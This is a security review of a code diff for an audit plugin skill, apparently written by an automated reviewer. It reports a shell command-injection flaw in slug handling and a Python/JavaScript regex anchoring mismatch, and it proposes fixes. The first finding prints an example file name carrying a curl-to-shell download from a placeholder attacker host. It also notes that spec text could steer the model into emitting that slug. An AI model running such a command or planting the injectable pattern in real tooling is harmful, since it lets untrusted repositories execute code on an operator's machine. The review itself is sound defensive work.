# Review: security

- Lens: security
- Verdict: findings
- Diff range: a22d7e7...HEAD

## Findings

### F1 — major — plugins/quorum/skills/audit/SKILL.md:86

**Claim:** The new slug-validation step interpolates an untrusted slug into a double-quoted shell argument, so a slug containing $(...) or backticks executes arbitrary commands before the validator ever inspects it.

**What:** Step 2 instructs the skill to run `python3 "${CLAUDE_PLUGIN_ROOT}/bin/audit.py" --check-slug "<slug>"`. Double quotes do not suppress command substitution in bash, so the shell evaluates any `$(...)` or backtick content in the slug and passes the *result* to audit.py. The check that exists to remove the model's judgment about odd slugs is therefore the thing that runs them. The same untrusted slug is also interpolated into the shell at SKILL.md:131 (`--hash docs/audit/<slug>/criteria.md`) and SKILL.md:219 (`--verify docs/audit/<slug>`).

**Failure scenario:** An audit target — by design a repository that never used this pipeline, and which workflow/audit.js:67 and bin/selftest.py:1374 both call untrusted input — contains a spec file named `docs/specs/$(curl -s http://attacker/p|sh; echo billing).md`, or a spec whose text steers the model toward that slug. Step 2 says the slug is "the spec file's basename" and then says "do not decide for yourself that a particular odd slug is harmless — that judgment is what the check exists to remove", so the skill hands the value straight to the check. Bash runs the curl-to-shell before python3 starts; audit.py then receives `billing`, exits 0, and the skill proceeds reporting that the slug is safe. Verified mechanically against this repo's own script: `bash -c "python3 \"plugins/quorum/bin/audit.py\" --check-slug \"$SLUG\""` with SLUG='$(printf INJECTED)' produced `audit: 'INJECTED' cannot be used as a slug ... Nothing has been written.` — the substitution had already executed. This also violates the plan's AC11 and the non-goal "Running the audited software": code derived from the audited repository ran on the operator's machine, on the default branch of a production repo.

**Suggested direction:** Keep the slug out of any shell word entirely. Pass it on stdin with a quoted heredoc delimiter (`python3 .../audit.py --check-slug - <<'SLUG' ... SLUG`), which bash does not expand, or have audit.py take the spec path and derive plus validate the slug itself. At minimum, single-quote the argument and make audit.py reject any slug containing a quote — but stdin is the only form that is safe regardless of what the model emits.

### F2 — minor — plugins/quorum/bin/audit.py:197

**Claim:** bin/audit.py's slug check accepts a value that workflow/audit.js rejects, contradicting the source comment that claims the two are the same pattern.

**What:** `SLUG.match(opts.check_slug)` uses `re.match` with a `$`-anchored pattern. In Python `$` matches at end of string *or* immediately before a trailing newline; in JavaScript (workflow/audit.js:22, same literal pattern, `.test()`) it matches only at end of input. The comment at audit.py:45 asserts "Same pattern as audit.js, deliberately", which is not true of the anchoring.

**Failure scenario:** `audit.py --check-slug $'billing\n'` exits 0 (verified: Python `SLUG.match('ok\n')` is truthy, `node` `/^[a-z0-9]+(-[a-z0-9]+)*$/.test("ok\n")` is false). The skill takes exit 0 as permission, writes `docs/audit/billing\n/criteria.md` — a directory whose name embeds a newline, which git then reports as a C-quoted path in the `git status --porcelain -uall` check at Step 6 — and the run then aborts at workflow/audit.js:22 with the slug rejected, after criteria.md is already on disk. The two validators of the same value disagree, so the mechanical guarantee the comment claims does not hold.

**Suggested direction:** Use `re.fullmatch`, or anchor with `\Z` instead of `$`, so the Python check is genuinely the same pattern as the JavaScript one; and correct or drop the "Same pattern as audit.js" claim in the comment.

## Notes

Range contained one commit (f50bcc0) plus one uncommitted edit to docs/work/quorum-audit/state.json (no security content). The diff's other security-relevant changes are net improvements and I found no defect in them: dropping Bash from quorum-auditor (agents/quorum-auditor.md:4), the EXEC_TOOLS assertion at bin/selftest.py:1394 which fires for every agent audit.js names including the write-only scribe, and the `-uall` change to the AC1 verification. Not reported, as it is out of lens or too weak to defend: `git status --porcelain -uall` still respects .gitignore, so a write to an ignored path would be invisible to the AC1 check — but with quorum-scribe holding only Write and a validated reportPath, I could not construct a concrete actor for that write.
